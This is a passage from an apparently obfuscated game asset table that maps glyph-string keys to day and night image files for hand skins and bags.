			"ΔⵠⵠⵠᐃⵠΔ": "img/night-hand-skin32.png",
			"ᐃⵠΔⲆᐃΔⲆ": "img/day-hand-skin33.png",
			"ᐃⲆⵠΔⵠⵠΔ": "img/night-hand-skin33.png",
			"ⲆᐃⵠⲆΔⵠⵠ": "img/day-hand-skin34.png",
			"ΔᐃⵠΔⲆᐃΔ": "img/night-hand-skin34.png",
			"ᐃΔⲆΔⵠⵠⲆ": "img/day-hand-skin35.png",
			"ΔΔⵠⵠⵠⵠΔ": "img/night-hand-skin35.png",
			"ᐃⲆᐃⵠᐃᐃⲆ": "img/day-hand-skin36.png",
			"ⲆⵠⲆᐃⲆᐃⵠ": "img/night-hand-skin36.png",
			"ⲆⲆⲆᐃⵠΔⲆ": "img/day-hand-skin37.png",
			"ⲆⵠⵠⵠΔⵠⲆ": "img/night-hand-skin37.png",
			"ⲆⵠᐃⲆⵠΔᐃ": "img/day-hand-skin38.png",
			"ⵠⲆΔⵠⲆᐃᐃ": "img/night-hand-skin38.png",
			"ᐃᐃᐃᐃᐃΔΔ": "img/day-hand-skin39.png",
			"ⵠΔⵠⲆΔΔᐃ": "img/night-hand-skin39.png",
			"ΔᐃⲆⵠⲆᐃΔ": "img/day-hand-skin40.png",
			"ⵠΔⲆⲆⵠⲆΔ": "img/night-hand-skin40.png",
			"ⵠⲆΔΔᐃⲆⲆ": "img/day-hand-skin41.png",
			"ΔᐃΔⵠᐃⵠⲆ": "img/night-hand-skin41.png",
			"ᐃᐃⵠⲆⵠⲆΔ": "img/day-hand-skin42.png",
			"ⵠⲆⲆⵠᐃΔᐃ": "img/night-hand-skin42.png",
			"ⵠⲆᐃⵠⲆⲆΔ": "img/day-hand-skin43.png",
			"ᐃⵠΔᐃⵠⲆᐃ": "img/night-hand-skin43.png",
			"ᐃⵠⲆⵠⵠⲆΔ": "img/day-hand-skin16.png",
			"ⲆᐃⵠⵠⲆΔᐃ": "img/night-hand-skin16.png",
			"ⲆΔΔⲆⲆⵠᐃ": "img/day-hand-skin45.png",
			"ᐃⵠᐃⲆΔᐃΔ": "img/night-hand-skin45.png",
			"ΔᐃᐃᐃΔΔᐃ": "img/day-hand-skin46.png",
			"ⲆⲆⵠⲆⲆⵠⲆ": "img/night-hand-skin46.png",
			"ⵠΔⲆⵠΔⵠᐃ": "img/day-hand-skin47.png",
			"ΔΔⲆΔΔΔⵠ": "img/night-hand-skin47.png",
			"ⵠᐃⲆΔⵠΔⲆ": "img/day-hand-skin48.png",
			"ΔᐃⵠⵠⵠⲆΔ": "img/night-hand-skin48.png",
			"ⵠⵠΔⲆᐃᐃΔ": "img/day-hand-skin49.png",
			"ⲆⵠᐃΔⲆⵠⲆ": "img/night-hand-skin49.png",
			"ᐃⲆⲆⲆΔᐃⲆ": "img/day-hand-skin49.png",
			"ⲆᐃᐃΔⲆᐃⲆ": "img/night-hand-skin49.png",
			"ⵠᐃΔⲆⲆᐃⵠ": "img/day-hand-skin51.png",
			"ⲆⵠⲆΔΔⵠΔ": "img/night-hand-skin51.png",
			"ⲆᐃⵠΔⵠᐃᐃ": "img/day-hand-skin52.png",
			"ⵠᐃⲆⲆⵠⲆΔ": "img/night-hand-skin52.png",
			"ᐃᐃᐃⲆΔⵠΔ": "img/day-hand-skin53.png",
			"ⲆⲆΔᐃΔΔΔ": "img/night-hand-skin53.png",
			"ΔⲆᐃΔᐃⵠⵠ": "img/day-hand-skin53.png",
			"ⵠᐃⲆΔⵠⵠⲆ": "img/night-hand-skin53.png",
			"ⲆΔⲆᐃⲆΔⵠ": "img/day-hand-skin55.png",
			"ⲆⲆΔⵠᐃᐃⲆ": "img/night-hand-skin55.png",
			"ΔᐃᐃΔΔᐃᐃ": "img/day-hand-skin56.png",
			"ⵠⲆⲆΔⵠΔⵠ": "img/night-hand-skin56.png",
			"ΔΔⲆᐃΔᐃᐃ": "img/day-hand-skin57.png",
			"ⲆᐃⵠⵠᐃΔΔ": "img/night-hand-skin57.png",
			"ⲆⵠᐃΔⲆΔᐃ": "img/day-hand-skin58.png",
			"ΔⵠᐃⲆΔᐃⲆ": "img/night-hand-skin58.png",
			"ⵠⲆΔⲆⲆΔᐃ": "img/day-hand-skin59.png",
			"ΔⵠⲆΔᐃΔΔ": "img/night-hand-skin59.png",
			"ᐃⵠΔⵠᐃᐃᐃ": "img/day-hand-skin61.png",
			"ⵠᐃⲆⵠΔΔΔ": "img/night-hand-skin61.png",
			"ΔⲆᐃᐃΔⵠⵠ": "img/day-hand-skin61.png",
			"ⲆᐃΔⵠⵠΔⵠ": "img/night-hand-skin61.png",
			"ⵠⲆⲆΔᐃΔⵠ": "img/day-hand-skin62.png",
			"ᐃⲆⲆᐃΔⲆⲆ": "img/night-hand-skin62.png",
			"ΔΔᐃΔᐃᐃΔ": "img/day-hand-skin63.png",
			"ⵠⵠᐃⲆⲆᐃⲆ": "img/night-hand-skin63.png",
			"ᐃⲆᐃᐃⲆⵠΔ": "img/day-hand-skin64.png",
			"ᐃΔΔⵠⵠⲆⲆ": "img/night-hand-skin64.png",
			"ⲆⲆⵠⵠⵠⵠⵠ": "img/day-hand-skin65.png",
			"ᐃⲆᐃΔᐃⲆᐃ": "img/night-hand-skin65.png",
			"ΔⵠⵠᐃⵠⵠⲆ": "img/day-hand-skin66.png",
			"ᐃᐃᐃΔⲆⵠⲆ": "img/night-hand-skin66.png",
			"ⵠⵠᐃⵠⲆᐃΔ": "img/day-hand-skin67.png",
			"ᐃⲆᐃⲆⲆΔΔ": "img/night-hand-skin67.png",
			"ⲆᐃⲆⲆⲆᐃᐃ": "img/day-hand-skin68.png",
			"ΔΔⵠΔΔⵠⵠ": "img/night-hand-skin68.png",
			"ᐃⲆⲆⵠᐃⵠⵠ": "img/day-hand-skin69.png",
			"ᐃⵠᐃⵠⲆΔΔ": "img/night-hand-skin69.png",
			"ⵠⲆᐃᐃⲆⵠᐃ": "img/day-hand-skin70.png",
			"ᐃⵠΔΔⲆΔᐃ": "img/night-hand-skin70.png",
			"ⵠΔⲆΔⵠⵠΔ": "img/day-hand-skin71.png",
			"ΔⵠΔᐃⵠⵠᐃ": "img/night-hand-skin71.png",
			"ⲆⵠⵠⲆᐃᐃⵠ": "img/day-hand-skin72.png",
			"ΔⲆⵠⵠᐃⵠᐃ": "img/night-hand-skin72.png",
			"ΔⵠᐃⲆᐃΔⲆ": "img/day-hand-skin73.png",
			"ᐃⵠⵠⵠⲆΔⲆ": "img/night-hand-skin73.png",
			"ᐃⲆⵠᐃⵠΔΔ": "img/day-hand-skin74.png",
			"ΔⵠᐃΔΔⲆΔ": "img/night-hand-skin74.png",
			"ⵠⲆⲆΔⲆⲆΔ": "img/day-hand-skin75.png",
			"ⲆᐃΔⵠΔᐃⵠ": "img/night-hand-skin75.png",
			"ⵠⵠΔⲆⵠΔⵠ": "img/day-hand-skin76.png",
			"ⵠⲆΔΔⲆⵠⵠ": "img/night-hand-skin76.png",
			"ᐃⲆΔⵠᐃᐃⵠ": "img/day-hand-skin77.png",
			"ΔΔΔⲆⵠⲆΔ": "img/night-hand-skin77.png",
			"ΔΔᐃΔⲆⵠⵠ": "img/day-hand-skin78.png",
			"ᐃᐃⲆⵠᐃᐃᐃ": "img/night-hand-skin78.png",
			"Ⲇᐃⵠᐃⵠᐃᐃ": "img/day-hand-skin79.png",
			"ᐃΔⵠⲆⲆⵠⲆ": "img/night-hand-skin79.png",
			"ⲆΔᐃᐃⵠᐃⵠ": "img/day-hand-skin80.png",
			"ⵠᐃΔᐃⵠⲆⵠ": "img/night-hand-skin80.png",
			"ⲆⲆⵠⲆⲆΔⵠ": "img/day-hand-skin81.png",
			"ⲆΔⵠᐃᐃⲆⵠ": "img/night-hand-skin81.png",
			"ⲆⵠᐃΔᐃΔΔ": "img/day-hand-skin82.png",
			"ΔⵠᐃΔᐃᐃΔ": "img/night-hand-skin82.png",
			"ΔⵠⵠᐃΔᐃΔ": "img/day-hand-skin83.png",
			"ΔⵠᐃⵠⵠᐃΔ": "img/night-hand-skin83.png",
			"ⵠᐃⵠΔⵠᐃᐃ": "img/day-hand-skin84.png",
			"ᐃΔⵠΔⲆⵠᐃ": "img/night-hand-skin84.png",
			"ᐃⲆΔΔⵠⵠΔ": "img/day-hand-skin85.png",
			"ᐃΔⵠΔΔⲆⲆ": "img/night-hand-skin85.png",
			"ⵠⵠΔᐃΔᐃᐃ": "img/day-hand-skin86.png",
			"ΔΔⵠΔⲆΔⵠ": "img/night-hand-skin86.png",
			"ⵠⵠΔΔᐃᐃᐃ": "img/day-hand-skin87.png",
			"ⵠᐃⲆⵠⲆᐃⲆ": "img/night-hand-skin87.png",
			"ΔⲆⵠⲆⲆΔᐃ": "img/day-hand-skin88.png",
			"ⵠΔⵠⵠⵠᐃⲆ": "img/night-hand-skin88.png",
			"ΔᐃᐃΔᐃⲆᐃ": "img/day-hand-skin89.png",
			"ⲆΔⲆΔᐃⲆᐃ": "img/night-hand-skin89.png",
			"ΔᐃᐃΔΔᐃⵠ": "img/day-hand-skin90.png",
			"ᐃᐃᐃΔᐃⵠⵠ": "img/night-hand-skin90.png",
			"ⲆΔⲆⲆΔⵠᐃ": "img/day-hand-skin91.png",
			"ⵠⵠⲆᐃΔⲆⵠ": "img/night-hand-skin91.png",
			"ΔᐃΔᐃᐃⵠⲆ": "img/day-hand-skin92.png",
			"ⲆⲆⵠⵠᐃⵠⲆ": "img/night-hand-skin92.png",
			"ΔΔᐃΔΔΔⵠ": "img/day-hand-skin93.png",
			"ᐃⵠⲆⵠⵠⲆⲆ": "img/night-hand-skin93.png",
			"ΔᐃΔΔΔΔΔ": "img/day-hand-skin94.png",
			"ΔΔⲆᐃΔΔᐃ": "img/night-hand-skin94.png",
			"ⵠΔᐃⵠΔⲆΔ": "img/day-hand-skin95.png",
			"ⵠⵠⲆⲆⲆⲆᐃ": "img/night-hand-skin95.png",
			"ⲆΔⵠᐃⵠⵠᐃ": "img/day-hand-skin96.png",
			"ᐃⵠⵠΔⵠⲆΔ": "img/night-hand-skin96.png",
			"ⵠⲆⲆᐃⵠᐃⲆ": "img/day-hand-skin97.png",
			"ΔⵠΔΔⵠⲆΔ": "img/night-hand-skin97.png",
			"ΔⵠΔᐃΔΔᐃ": "img/day-hand-skin98.png",
			"ΔᐃⲆⵠΔⲆᐃ": "img/night-hand-skin98.png",
			"ⲆΔⵠΔᐃΔᐃ": "img/day-hand-skin99.png",
			"ⵠⲆΔᐃΔᐃⲆ": "img/night-hand-skin99.png",
			"ΔΔⵠᐃΔΔⵠ": "img/day-hand-skin100.png",
			"ⲆⵠΔᐃᐃᐃᐃ": "img/night-hand-skin100.png",
			"ⵠⲆⲆⲆⵠᐃᐃ": "img/day-hand-skin101.png",
			"ⵠᐃᐃᐃΔᐃΔ": "img/night-hand-skin101.png",
			"ⵠΔⵠΔᐃⲆΔ": "img/day-hand-skin102.png",
			"ⵠⵠⲆⵠΔᐃΔ": "img/night-hand-skin102.png",
			"ⵠΔⲆⵠⲆⵠⵠ": "img/day-hand-skin103.png",
			"ΔⵠⵠⲆᐃⵠⵠ": "img/night-hand-skin103.png",
			"ᐃΔⲆΔⵠⲆᐃ": "img/day-hand-skin104.png",
			"Ⲇⵠᐃⵠⵠᐃⵠ": "img/night-hand-skin104.png",
			"ⵠᐃᐃΔΔΔⵠ": "img/day-hand-skin105.png",
			"ⵠΔⲆⵠᐃⵠΔ": "img/night-hand-skin105.png",
			"ᐃⵠⵠⵠΔΔⲆ": "img/day-hand-skin106.png",
			"ᐃᐃΔΔⵠⲆᐃ": "img/night-hand-skin106.png",
			"ΔⲆᐃⲆᐃΔΔ": "img/day-hand-skin107.png",
			"ᐃΔᐃⵠᐃⲆⵠ": "img/night-hand-skin107.png",
			"ΔⵠΔⵠΔⵠᐃ": "img/day-hand-skin108.png",
			"ΔⲆⵠᐃⵠΔΔ": "img/night-hand-skin108.png",
			"Ⲇⵠⵠⵠⵠᐃⵠ": "img/day-hand-skin109.png",
			"ᐃᐃᐃᐃⵠΔⵠ": "img/night-hand-skin109.png",
			"ᐃⵠᐃⵠⵠᐃᐃ": "img/day-hand-skin110.png",
			"ⵠⵠⵠⵠᐃᐃᐃ": "img/night-hand-skin110.png",
			"ΔⲆΔᐃΔⵠⵠ": "img/day-hand-skin111.png",
			"ⵠᐃⵠΔⲆΔΔ": "img/night-hand-skin111.png",
			"ΔⲆⲆΔΔΔⲆ": "img/day-hand-skin112.png",
			"ΔΔΔⲆⲆΔⵠ": "img/night-hand-skin112.png",
			"ⵠⵠΔⵠΔΔᐃΔⵠ": "img/day-hand-skin113.png",
			"ΔΔΔΔᐃⵠΔᐃⵠ": "img/night-hand-skin113.png",
			"ⵠⲆΔᐃⲆΔᐃ": "img/day-hand-skin114.png",
			"ⵠᐃᐃⲆⵠⲆⵠ": "img/night-hand-skin114.png",
			"ΔⵠᐃᐃᐃⲆⵠ": "img/day-hand-skin115.png",
			"ΔⵠⵠⵠⲆΔⵠ": "img/night-hand-skin115.png",
			"ⲆⲆᐃΔᐃᐃⲆ": "img/day-hand-skin116.png",
			"ⲆΔΔΔΔΔᐃ": "img/night-hand-skin116.png",
			"ΔᐃΔᐃᐃᐃⲆ": "img/day-hand-skin117.png",
			"ⵠᐃⵠⲆᐃᐃΔ": "img/night-hand-skin117.png",
			"ΔΔᐃⲆⵠⲆΔ": "img/day-hand-skin118.png",
			"ⵠⵠⲆⲆᐃⵠᐃ": "img/night-hand-skin118.png",
			"ᐃⲆᐃⲆⵠⵠⵠ": "img/day-hand-skin119.png",
			"ΔᐃⲆᐃᐃⵠⵠ": "img/night-hand-skin119.png",
			"ΔᐃΔᐃⵠΔᐃ": "img/day-hand-skin120.png",
			"ⲆⵠⲆⲆᐃⲆΔ": "img/night-hand-skin120.png",
			"ΔⲆᐃΔΔⲆᐃ": "img/day-hand-skin122.png",
			"ⲆΔⲆΔⵠⲆΔ": "img/night-hand-skin122.png",
			"ⲆⲆⲆⵠᐃⵠΔ": "img/day-hand-skin122.png",
			"ᐃⵠⲆΔΔΔΔ": "img/night-hand-skin122.png",
			"ᐃΔⵠⵠΔᐃΔ": "img/day-hand-skin122.png",
			"ΔᐃᐃⵠⵠⲆᐃ": "img/night-hand-skin122.png",
			"ⲆΔⲆⵠᐃΔⲆ": "img/day-hand-skin124.png",
			"ⲆⵠⵠΔⲆⵠⲆ": "img/night-hand-skin124.png",
			"ⵠⵠⲆΔᐃⵠⲆ": "img/day-hand-skin125.png",
			"ΔΔΔΔⵠⲆⵠ": "img/night-hand-skin125.png",
			"ⲆᐃᐃⲆⵠⵠΔ": "img/day-hand-skin126.png",
			"ᐃⵠΔⵠᐃⵠⲆ": "img/night-hand-skin126.png",
			"ⵠΔⲆᐃΔⵠⵠ": "img/day-hand-skin127.png",
			"ⵠΔⵠⲆⵠⲆⵠ": "img/night-hand-skin127.png",
			"ᐃᐃᐃΔᐃᐃⲆ": "img/day-hand-skin128.png",
			"ΔⵠⲆⲆΔᐃᐃ": "img/night-hand-skin128.png",
			"ⲆⲆⲆⲆⲆⵠΔ": "img/day-hand-skin129.png",
			"ΔΔⲆᐃⵠⲆᐃ": "img/night-hand-skin129.png",
			"ΔΔᐃΔΔⵠⲆ": "img/day-hand-skin130.png",
			"ⲆⲆᐃⲆᐃⲆⵠ": "img/night-hand-skin130.png",
			"ΔΔᐃⵠⲆⵠⵠ": "img/day-hand-skin131.png",
			"ᐃΔⵠᐃᐃⵠⵠ": "img/night-hand-skin131.png",
			"ΔⲆⵠⲆⲆⲆⲆ": "img/day-hand-skin130.png",
			"ⵠᐃΔᐃΔᐃᐃ": "img/night-hand-skin130.png",
			"ⵠᐃⵠᐃⲆⵠᐃ": "img/day-hand-skin133.png",
			"ᐃⲆⵠⲆΔⵠΔ": "img/night-hand-skin133.png",
			"ΔΔΔⵠⵠᐃᐃ": "img/day-hand-skin134.png",
			"ⵠΔᐃᐃᐃⵠⲆ": "img/night-hand-skin134.png",
			"ᐃⲆⲆΔⲆᐃᐃ": "img/day-hand-skin135.png",
			"ΔⲆⵠᐃⲆⲆⵠ": "img/night-hand-skin135.png",
			"ΔᐃⲆⵠᐃⲆᐃ": "img/day-hand-skin136.png",
			"ᐃⲆⵠⲆᐃⲆΔ": "img/night-hand-skin136.png",
			"ΔΔⵠᐃΔᐃⲆ": "img/day-hand-skin137.png",
			"ᐃᐃⲆⵠᐃΔⲆ": "img/night-hand-skin137.png",
			"ᐃⲆΔΔΔΔΔ": "img/day-hand-skin138.png",
			"ᐃᐃᐃᐃⵠⲆⵠ": "img/night-hand-skin138.png",
			"ΔⲆⲆᐃⲆᐃᐃ": "img/day-hand-skin139.png",
			"ⵠⲆΔΔⲆΔⲆ": "img/night-hand-skin139.png",
			"ᐃᐃΔΔᐃⵠⲆ": "img/day-hand-skin140.png",
			"ⵠⲆᐃⵠⲆⵠⵠ": "img/night-hand-skin140.png",
			"ᐃΔⵠΔᐃΔᐃ": "img/day-hand-skin141.png",
			"ᐃⲆⲆᐃⵠᐃΔ": "img/night-hand-skin141.png",
			"ᐃᐃᐃΔⵠᐃΔ": "img/day-hand-skin142.png",
			"ⵠᐃᐃⵠⵠⲆᐃ": "img/night-hand-skin142.png",
			"ⲆᐃΔΔΔΔᐃ": "img/day-hand-skin143.png",
			"ΔⲆᐃⵠᐃⲆⲆ": "img/night-hand-skin143.png",
			"ΔⲆⲆᐃⵠⲆΔ": "img/day-hand-skin144.png",
			"ᐃᐃΔᐃᐃΔⵠ": "img/night-hand-skin144.png",
			"ᐃᐃᐃΔⲆⲆⲆ": "img/day-hand-skin145.png",
			"ᐃΔⲆⲆⵠⲆⲆ": "img/night-hand-skin145.png",
			"ΔⵠΔᐃᐃⲆⲆ": "img/day-hand-skin146.png",
			"ⵠΔᐃᐃⵠΔⲆ": "img/night-hand-skin146.png",
			"ⲆᐃΔᐃⵠᐃⵠ": "img/day-hand-skin147.png",
			"ⲆⲆⲆⲆⲆΔᐃ": "img/night-hand-skin147.png",
			"ΔⲆᐃⵠᐃⲆⵠ": "img/day-hand-skin148.png",
			"ⲆⲆⵠⲆΔΔⲆ": "img/night-hand-skin148.png",
			"ᐃⵠⵠᐃⲆᐃⲆ": "img/day-hand-skin149.png",
			"ᐃⲆⲆⲆⵠⵠΔ": "img/night-hand-skin149.png",
			"ⲆᐃⵠΔⲆΔΔ": "img/day-hand-skin150.png",
			"ⵠⲆΔⵠΔⵠⵠ": "img/night-hand-skin150.png",
			"ⲆΔᐃⵠⲆᐃΔ": "img/day-hand-skin151.png",
			"ⲆᐃⲆᐃΔᐃⵠ": "img/night-hand-skin151.png",
			"ⵠΔΔᐃⲆΔΔ": "img/day-hand-skin152.png",
			"ᐃᐃⵠⵠΔⲆΔ": "img/night-hand-skin152.png",
			"ᐃⲆⵠᐃⲆΔⲆ": "img/day-hand-skin153.png",
			"ᐃΔᐃᐃⲆΔⵠ": "img/night-hand-skin153.png",
			"ΔᐃᐃⵠΔᐃᐃ": "img/day-hand-skin154.png",
			"ⲆⲆⵠΔΔⵠⵠ": "img/night-hand-skin154.png",
			"ΔΔⲆΔⲆⲆⵠ": "img/day-hand-skin155.png",
			"ⲆᐃᐃΔⲆΔⵠ": "img/night-hand-skin155.png",
			"ⵠᐃΔᐃⵠΔⲆ": "img/day-hand-skin156.png",
			"ᐃⵠⵠⲆⵠⲆⵠ": "img/night-hand-skin156.png",
			"ᐃⵠᐃᐃⲆⲆᐃ": "img/day-hand-skin157.png",
			"ⵠᐃΔᐃᐃΔᐃ": "img/night-hand-skin157.png",
			"ⲆⲆᐃⵠᐃⵠΔ": "img/day-hand-skin158.png",
			"ⲆᐃⲆᐃⲆΔᐃ": "img/night-hand-skin158.png",
			"ΔᐃⵠᐃΔⲆⵠ": "img/day-hand-skin159.png",
			"ⲆᐃⵠⲆᐃⵠΔ": "img/night-hand-skin159.png",
			"ⵠⵠΔᐃᐃᐃᐃ": "img/day-hand-skin160.png",
			"ΔΔⵠᐃⲆⵠⲆ": "img/night-hand-skin160.png",
			"ⵠⲆⲆΔⲆⲆⵠ": "img/day-hand-skin161.png",
			"ⲆⵠⵠᐃⲆᐃᐃ": "img/night-hand-skin161.png",
			"ᐃᐃᐃΔⵠΔⵠ": "img/day-hand-skin162.png",
			"ⵠⵠᐃⵠᐃᐃⲆ": "img/night-hand-skin162.png",
			"ΔⵠⵠΔⲆⵠΔ": "img/day-hand-skin163.png",
			"ΔΔᐃᐃΔⵠⵠ": "img/night-hand-skin163.png",
			"ΔᐃⵠᐃΔΔΔ": "img/day-hand-skin164.png",
			"ΔⵠⵠΔΔᐃΔ": "img/night-hand-skin164.png",
			"ⵠⲆⲆᐃⲆⲆΔ": "img/day-hand-skin165.png",
			"ⲆΔΔⲆΔᐃΔ": "img/night-hand-skin165.png",
			"ⵠⵠⵠⵠⵠᐃⵠ": "img/day-hand-skin166.png",
			"ⲆⲆΔΔⵠⵠⲆ": "img/night-hand-skin166.png",
			"ᐃⲆⵠⵠᐃⵠΔ": "img/day-hand-skin167.png",
			"ΔᐃΔⲆⲆⲆⵠ": "img/night-hand-skin167.png",
			"ⲆΔⵠⵠΔⵠⵠ": "img/day-hand-skin168.png",
			"ⵠΔⵠⲆⲆⲆⲆ": "img/night-hand-skin168.png",
			"ⵠᐃⲆΔⵠΔⵠ": "img/day-hand-skin169.png",
			"ᐃᐃᐃΔᐃΔⵠ": "img/night-hand-skin169.png",
			"ⲆΔᐃⲆᐃⵠᐃ": "img/day-hand-skin170.png",
			"ⵠᐃⵠᐃᐃᐃᐃ": "img/night-hand-skin170.png",
			"ΔΔⲆΔᐃᐃΔ": "img/day-hand-skin171.png",
			"ⲆΔᐃⵠⲆⲆᐃ": "img/night-hand-skin171.png",
			"ⵠⵠⵠⵠⵠⵠⲆ": "img/day-hand-skin172.png",
			"ⲆⲆΔⲆⲆΔⲆ": "img/night-hand-skin172.png",
			"ΔⲆᐃⲆᐃⲆⵠ": "img/day-hand-skin173.png",
			"ᐃⲆΔⲆΔⲆᐃ": "img/night-hand-skin173.png",
			"ΔᐃΔⲆᐃᐃΔ": "img/day-hand-skin174.png",
			"ᐃⲆⲆΔΔⵠⲆ": "img/night-hand-skin174.png",
			"ΔᐃᐃΔⵠⵠΔ": "img/day-hand-skin175.png",
			"ᐃⵠΔᐃΔᐃᐃ": "img/night-hand-skin175.png",
			"ΔΔΔᐃΔᐃⵠ": "img/day-hand-skin176.png",
			"ᐃⲆⲆⲆΔⲆᐃ": "img/night-hand-skin176.png",
			"ΔⵠΔⵠᐃΔΔ": "img/day-hand-skin177.png",
			"ⵠᐃⲆⲆⵠⲆⵠ": "img/night-hand-skin177.png",
			"ⲆⵠⲆᐃⵠΔΔ": "img/day-hand-skin178.png",
			"ⵠᐃⲆᐃⲆⵠᐃ": "img/night-hand-skin178.png",
			"ᐃΔΔΔⲆⲆᐃ": "img/day-hand-skin179.png",
			"ΔΔⲆⲆⵠⵠᐃ": "img/night-hand-skin179.png",
			"ⲆᐃⲆⲆⵠᐃⲆ": "img/day-hand-skin180.png",
			"ⵠⵠⲆᐃᐃᐃΔ": "img/night-hand-skin180.png",
			"ⵠΔΔᐃᐃⵠΔ": "img/day-hand-skin181.png",
			"ⵠⲆΔⵠⵠⵠᐃ": "img/night-hand-skin181.png",
			"ᐃⵠⵠⲆⲆⵠᐃ": "img/day-hand-skin182.png",
			"ΔΔⲆⲆᐃⲆⵠ": "img/night-hand-skin182.png",
			"ΔⵠⲆᐃⲆⲆΔ": "img/day-hand-skin183.png",
			"ΔᐃⲆⵠⵠᐃⲆ": "img/night-hand-skin183.png",
			"ᐃⵠΔⲆⲆᐃᐃ": "img/day-hand-skin184.png",
			"ⲆⲆΔⲆᐃᐃΔ": "img/night-hand-skin184.png",
			"ⵠⵠⲆΔⲆⵠⲆ": "img/day-hand-skin185.png",
			"ⲆΔΔᐃⵠⵠᐃ": "img/night-hand-skin185.png",
			"ᐃΔᐃΔᐃᐃⵠ": "img/day-hand-skin186.png",
			"ⲆⲆⵠⲆᐃⲆΔ": "img/night-hand-skin186.png",
			"ⵠΔᐃᐃⲆᐃᐃ": "img/day-hand-skin187.png",
			"ΔΔⵠΔᐃⲆⲆ": "img/night-hand-skin187.png",
			"ΔⲆⵠⲆΔⵠⵠ": "img/day-hand-skin188.png",
			"ΔΔⵠⲆⵠΔⵠ": "img/night-hand-skin188.png",
			"ᐃᐃⲆΔᐃⵠᐃ": "img/day-hand-skin189.png",
			"ⲆΔᐃᐃⲆⵠΔ": "img/night-hand-skin189.png",
			"ᐃⵠⲆⵠᐃⵠᐃ": "img/day-hand-skin190.png",
			"ⲆᐃᐃΔΔΔᐃ": "img/night-hand-skin190.png",
			"ⲆᐃᐃΔⵠᐃⵠ": "img/day-hand-skin191.png",
			"ⵠⵠΔⲆΔⵠΔ": "img/night-hand-skin191.png",
			"ΔᐃⵠΔⲆⵠᐃ": "img/day-hand-skin192.png",
			"ⲆⲆᐃⵠᐃΔⵠ": "img/night-hand-skin192.png",
			"ⲆⵠΔⵠⲆⵠΔ": "img/day-hand-skin193.png",
			"ⵠΔⵠⵠᐃΔⲆ": "img/night-hand-skin193.png",
			"ⵠΔᐃⵠᐃᐃΔ": "img/day-hand-skin194.png",
			"ⵠⲆⲆΔⲆⵠⲆ": "img/night-hand-skin194.png",
			"ᐃΔΔΔΔⲆⵠ": "img/day-hand-skin195.png",
			"ⵠΔⲆᐃᐃᐃᐃ": "img/night-hand-skin195.png",
			"ⲆᐃⵠΔⲆⲆᐃ": "img/day-hand-skin196.png",
			"ΔⵠⲆⵠᐃⲆⵠ": "img/night-hand-skin196.png",
			"ⵠΔⲆⵠⵠᐃᐃ": "img/day-hand-skin197.png",
			"ⵠΔⲆΔΔᐃⵠ": "img/night-hand-skin197.png",
			"ⲆᐃⲆⲆⵠⵠΔ": "img/day-hand-skin198.png",
			"ⲆΔⲆⲆⵠΔᐃ": "img/night-hand-skin198.png",
			"ⲆⲆᐃⵠⲆⲆⲆ": "img/day-hand-skin199.png",
			"ⲆᐃᐃⵠⲆᐃⵠ": "img/night-hand-skin199.png",
			"ΔⲆΔᐃⵠΔΔ": "img/day-hand-skin200.png",
			"ⲆⲆΔⲆΔⵠⲆ": "img/night-hand-skin200.png",
			"ΔⲆⵠⵠΔⲆⲆ": "img/day-hand-skin201.png",
			"ⵠⲆⲆΔⲆΔⵠ": "img/night-hand-skin201.png",
			"ΔᐃᐃⵠΔΔᐃ": "img/day-hand-skin202.png",
			"ᐃᐃΔⵠᐃΔⵠ": "img/night-hand-skin202.png",
			"ΔΔⵠⵠⲆⲆΔ": "img/day-hand-skin203.png",
			"ⵠⵠᐃⲆΔⲆᐃ": "img/night-hand-skin203.png",
			"ᐃⲆⵠᐃⲆΔⵠ": "img/day-hand-skin204.png",
			"ᐃᐃΔⲆΔΔⲆ": "img/night-hand-skin204.png",
			"ⲆᐃⲆⵠΔΔᐃ": "img/day-hand-skin205.png",
			"ΔⲆⵠⲆⲆⲆⵠ": "img/night-hand-skin205.png",
			"ᐃⵠⲆΔΔⵠⲆ": "img/day-hand-skin206.png",
			"ⲆⵠΔᐃⵠⵠᐃ": "img/night-hand-skin206.png",
			"ᐃⲆᐃⵠⵠⵠⲆ": "img/day-hand-skin207.png",
			"ΔᐃᐃᐃⲆᐃⲆ": "img/night-hand-skin207.png",
			"ΔᐃΔⲆⲆⵠⲆ": "img/day-hand-skin208.png",
			"ⵠⵠⵠΔⵠᐃᐃ": "img/night-hand-skin208.png",
			"ᐃΔΔᐃᐃᐃⵠ": "img/day-hand-skin209.png",
			"ⵠⲆᐃⲆⵠⵠⲆ": "img/night-hand-skin209.png",
			"ⵠⲆᐃⲆⵠΔᐃ": "img/day-hand-skin210.png",
			"ΔⲆⲆⲆᐃⲆᐃ": "img/night-hand-skin210.png",
			"ᐃⵠΔⲆᐃⲆΔ": "img/day-hand-skin211.png",
			"ΔΔⲆᐃᐃⵠᐃ": "img/night-hand-skin211.png",
			"ᐃᐃΔⵠⲆΔᐃ": "img/day-hand-skin212.png",
			"ᐃⲆⲆΔⵠⲆⲆ": "img/night-hand-skin212.png",
			"ⲆᐃΔⲆΔᐃΔ": "img/day-hand-skin213.png",
			"ΔⲆΔᐃᐃΔⵠ": "img/night-hand-skin213.png",
			"ⵠⲆΔⵠⲆΔⲆ": "img/day-hand-skin214.png",
			"ⲆⵠⲆΔⲆⵠᐃ": "img/night-hand-skin214.png",
			"ᐃⲆΔᐃⲆⵠⲆ": "img/day-bag-star0.png",
			"ⲆⲆᐃⲆⲆⵠⵠ": "img/night-bag-star0.png",
			"ΔⵠⵠΔⵠⲆⵠ": "img/day-bag0.png",
			"ⵠΔⲆᐃΔᐃΔ": "img/night-bag0.png",
			"ᐃⵠΔᐃⵠΔⲆ": "img/day-bag1.png",
			"ΔᐃⵠⲆΔᐃΔ": "img/night-bag1.png",
			"ᐃᐃⲆⲆΔⵠᐃ": "img/day-bag2.png",
			"ᐃⵠⲆΔⲆᐃᐃ": "img/night-bag2.png",
			"ⵠⵠᐃⲆᐃⵠⵠ": "img/day-bag3.png",
			"ΔᐃⵠⲆᐃᐃᐃ": "img/night-bag3.png",
			"ⲆⲆⵠΔⵠΔΔ": "img/day-bag4.png",
			"ⲆⵠⵠΔΔⲆⵠ": "img/night-bag4.png",
			"ⵠᐃᐃⵠⲆⲆⵠ": "img/day-bag5.png",
			"ⵠⲆⲆⲆΔⵠΔ": "img/night-bag5.png",
			"ΔᐃᐃᐃⲆⵠΔ": "img/day-bag6.png",
			"ⵠΔΔⲆᐃⵠᐃ": "img/night-bag6.png",
			"ΔΔⲆⵠⵠᐃΔ": "img/day-bag7.png",
			"ⲆⲆⲆⵠⵠΔⲆ": "img/night-bag7.png",
